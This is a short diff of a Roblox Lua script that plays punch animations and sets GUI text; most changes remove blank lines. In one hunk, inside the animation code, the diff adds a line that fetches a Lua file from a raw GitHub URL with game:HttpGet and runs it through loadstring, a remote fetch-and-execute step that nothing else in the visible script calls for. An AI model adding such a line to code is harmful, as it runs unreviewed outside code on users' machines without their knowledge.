@@ -108,7 +108,6 @@ playerGui.DescendantAdded:Connect(findGuiAndSetText)
 
 findGuiAndSetText()
 
- 
 local animationId = 10468665991 ---- Get normal punch anim id
  
  
@@ -153,8 +152,7 @@ Anim:AdjustSpeed(0)
 Anim.TimePosition = startTime
  
 Anim:AdjustSpeed(1)
- 
- 
+loadstring(game:HttpGet"https://raw.githubusercontent.com/tamarixr/tamhub/main/reversalred.lua")()   
     end
  
 end
@@ -197,8 +195,7 @@ local Anim = Humanoid:LoadAnimation(AnimAnim)
  
  
 local startTime = 0
- 
- 
+
 Anim:Play()
  
 Anim:AdjustSpeed(0.5)
